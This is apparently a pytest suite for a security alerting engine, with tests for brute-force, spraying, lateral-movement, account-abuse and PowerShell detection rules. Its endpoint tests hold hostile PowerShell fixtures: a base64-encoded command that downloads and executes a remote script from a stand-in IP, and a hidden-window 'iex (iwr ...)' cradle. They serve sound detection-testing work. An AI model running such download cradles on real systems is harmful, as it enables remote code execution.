from __future__ import annotations

from datetime import UTC, datetime

import pytest

from app.detection.rules.endpoint import decode_powershell, powershell_indicators
from app.models.common import Severity
from app.models.events import EventSource, EventType
from tests.conftest import ev, rules_fired

LINUX = EventSource.linux_auth
ATTACKER = "203.0.113.45"


def ssh_failures(n: int, ip: str = ATTACKER, users=("root",), every: float = 5, host: str = "bastion-01"):
    return [
        ev("logon_failed", seconds=i * every, source=LINUX, hostname=host, source_ip=ip, username=users[i % len(users)]) for i in range(n)
    ]


class TestSshBruteForce:
    def test_fires_at_threshold(self, engine):
        alerts = [a for a in engine.run(ssh_failures(8)) if a.rule_id == "LAB-001"]
        assert len(alerts) == 1
        alert = alerts[0]
        assert (alert.severity, alert.source_ip, alert.hostname, alert.event_count) == (Severity.high, ATTACKER, "bastion-01", 8)
        assert alert.mitre[0].technique_id == "T1110.001"
        assert alert.timestamp > alert.first_seen

    def test_below_threshold_is_quiet(self, engine):
        assert "LAB-001" not in rules_fired(engine, ssh_failures(7))

    def test_slow_attempts_outside_window_do_not_fire(self, engine):
        assert "LAB-001" not in rules_fired(engine, ssh_failures(10, every=90))

    def test_tuned_threshold(self, engine):
        rule = engine.rule("LAB-001")
        assert len(engine.run_rule(rule, ssh_failures(4), {"threshold": 4})) == 1

    def test_internal_source_gets_false_positive_hint(self, engine):
        alert = next(a for a in engine.run(ssh_failures(9, ip="10.10.2.15")) if a.rule_id == "LAB-001")
        assert alert.fp_hints and "internal" in alert.fp_hints[0]


class TestCredentialRules:
    def test_windows_brute_force_escalates_for_privileged_account(self, engine):
        events = [ev("logon_failed", seconds=i * 3, hostname="dc-01", username="administrator", source_ip="198.51.100.9") for i in range(6)]
        alert = next(a for a in engine.run(events) if a.rule_id == "LAB-002")
        assert alert.severity == Severity.high

    def test_machine_accounts_are_ignored(self, engine):
        events = [ev("logon_failed", seconds=i, hostname="dc-01", username="ws-01$") for i in range(10)]
        assert "LAB-002" not in rules_fired(engine, events)

    def test_password_spraying_vs_brute_force(self, engine):
        users = ("a", "b", "c", "d", "e")
        spray = [ev("logon_failed", seconds=i * 10, hostname="dc-01", username=users[i % 5], source_ip=ATTACKER) for i in range(7)]
        assert "LAB-003" in rules_fired(engine, spray)
        # Same distinct users but many attempts each = brute force, not spraying.
        brute = [ev("logon_failed", seconds=i * 2, hostname="dc-01", username=users[i % 5], source_ip=ATTACKER) for i in range(30)]
        assert "LAB-003" not in rules_fired(engine, brute)

    def test_success_after_failures_is_critical(self, engine):
        events = ssh_failures(6) + [
            ev("logon_success", seconds=60, source=LINUX, hostname="bastion-01", source_ip=ATTACKER, username="deploy")
        ]
        alert = next(a for a in engine.run(events) if a.rule_id == "LAB-004")
        assert (alert.severity, alert.username) == (Severity.critical, "deploy")

    def test_success_from_other_ip_is_not_correlated(self, engine):
        events = ssh_failures(6) + [
            ev("logon_success", seconds=60, source=LINUX, hostname="bastion-01", source_ip="10.10.10.24", username="x")
        ]
        assert "LAB-004" not in rules_fired(engine, events)


class TestBehaviouralRules:
    NIGHT = datetime(2026, 10, 29, 5, 30, tzinfo=UTC)  # 02:30 in Sao Paulo

    def test_privileged_off_hours_interactive_logon(self, engine):
        e = ev("logon_success", at=self.NIGHT, hostname="dc-01", username="adm.roliveira", logon_type=10, source_ip="10.10.10.24")
        assert "LAB-005" in rules_fired(engine, [e])

    def test_network_logon_or_business_hours_is_quiet(self, engine):
        network = ev("logon_success", at=self.NIGHT, hostname="dc-01", username="adm.roliveira", logon_type=3)
        daytime = ev("logon_success", hostname="dc-01", username="adm.roliveira", logon_type=10)
        regular = ev("logon_success", at=self.NIGHT, hostname="ws-fin-01", username="j.silva", logon_type=2)
        assert "LAB-005" not in rules_fired(engine, [network, daytime, regular])

    def test_maintenance_window_hint(self, engine):
        inside = datetime(2026, 10, 26, 4, 30, tzinfo=UTC)
        alert = engine.run([ev("logon_success", at=inside, hostname="dc-01", username="adm.roliveira", logon_type=10)])[0]
        assert any("CHG-2041" in h for h in alert.fp_hints)

    def test_lateral_movement_excludes_domain_controllers(self, engine):
        hosts = ["fs-01", "app-01", "ws-hr-02"]
        events = [ev("logon_success", seconds=i * 30, hostname=h, username="a.costa", logon_type=3) for i, h in enumerate(hosts)]
        assert "LAB-013" in rules_fired(engine, events)
        with_dc = [
            ev("logon_success", seconds=i * 30, hostname=h, username="a.costa", logon_type=3)
            for i, h in enumerate(["fs-01", "dc-01", "app-01"])
        ]
        assert "LAB-013" not in rules_fired(engine, with_dc)


class TestAccountRules:
    def test_new_account_then_privileged_group_is_critical(self, engine):
        created = ev(
            "user_created", event_type=EventType.account_management, hostname="dc-01", username="adm.roliveira", target_username="evil"
        )
        added = ev("group_member_added", seconds=120, event_type=EventType.account_management, hostname="dc-01",
                   username="adm.roliveira", target_username="evil", group_name="Domain Admins")  # fmt: skip
        alerts = {a.rule_id: a for a in engine.run([created, added])}
        assert alerts["LAB-007"].severity == Severity.medium
        assert alerts["LAB-008"].severity == Severity.critical

    def test_non_privileged_group_is_ignored(self, engine):
        added = ev(
            "group_member_added", event_type=EventType.account_management, hostname="dc-01", target_username="x", group_name="Finance"
        )
        assert rules_fired(engine, [added]) == []

    def test_sudo_denied(self, engine):
        e = ev("sudo_denied", source=LINUX, event_type=EventType.privilege, hostname="web-01", username="bob", command_line="/bin/bash")
        assert rules_fired(engine, [e]) == ["LAB-014"]


class TestEndpointRules:
    ENCODED = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA="

    def test_decodes_encoded_command_without_executing(self):
        decoded = decode_powershell(f"powershell -enc {self.ENCODED}")
        assert decoded is not None and "DownloadString('http://203.0.113.80/update.ps1')" in decoded

    def test_indicator_categories(self):
        assert set(powershell_indicators("powershell -nop -w hidden iex (iwr http://x)")) >= {
            "policy bypass",
            "hidden window",
            "in-memory execution",
            "download cradle",
        }

    @pytest.mark.parametrize(
        ("command", "expected"),
        [
            (f"powershell.exe -nop -w hidden -enc {ENCODED}", Severity.critical),
            ("powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\x.ps1 -w hidden", Severity.high),
            ("powershell.exe Get-ChildItem C:\\", None),
        ],
    )
    def test_suspicious_powershell(self, engine, command, expected):
        e = ev("process_created", event_type=EventType.process, hostname="ws-fin-01", username="j.silva",
               process_name="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", command_line=command)  # fmt: skip
        alerts = [a for a in engine.run([e]) if a.rule_id == "LAB-009"]
        assert (alerts[0].severity if alerts else None) == expected

    def test_log_clear_and_persistence(self, engine):
        cleared = ev("audit_log_cleared", event_type=EventType.audit, hostname="ws-fin-01", username="j.silva")
        svc_ok = ev("service_installed", event_type=EventType.persistence, hostname="app-01", command_line="C:\\Program Files\\Agent\\agent.exe",
                    fields={"service_name": "Agent"})  # fmt: skip
        svc_bad = ev("service_installed", event_type=EventType.persistence, hostname="app-01", command_line="%SystemRoot%\\Temp\\x.exe",
                     fields={"service_name": "X"})  # fmt: skip
        alerts = engine.run([cleared, svc_ok, svc_bad])
        severities = sorted((a.rule_id, a.severity.value) for a in alerts)
        assert severities == [("LAB-010", "critical"), ("LAB-012", "high"), ("LAB-012", "medium")]


class TestEngine:
    def test_idempotent_alert_ids(self, engine):
        events = ssh_failures(10)
        assert [a.id for a in engine.run(events)] == [a.id for a in engine.run(events)]

    def test_disabled_rule_is_skipped(self, engine):
        from app.detection.engine import RuleConfig

        assert engine.run(ssh_failures(10), {"LAB-001": RuleConfig(enabled=False)}) == []

    def test_rule_failure_is_isolated(self, engine, monkeypatch):
        def boom(*args, **kwargs):
            raise RuntimeError("bug")

        monkeypatch.setattr(engine.rule("LAB-003"), "evaluate", boom)
        assert "LAB-001" in rules_fired(engine, ssh_failures(10))

    def test_every_rule_has_metadata(self, engine):
        assert len(engine.rules) == 18
        for rule in engine.rules:
            assert rule.mitre and rule.response and rule.false_positives and rule.logic
            rule.logic.format(**rule.defaults())  # logic templates only reference real params
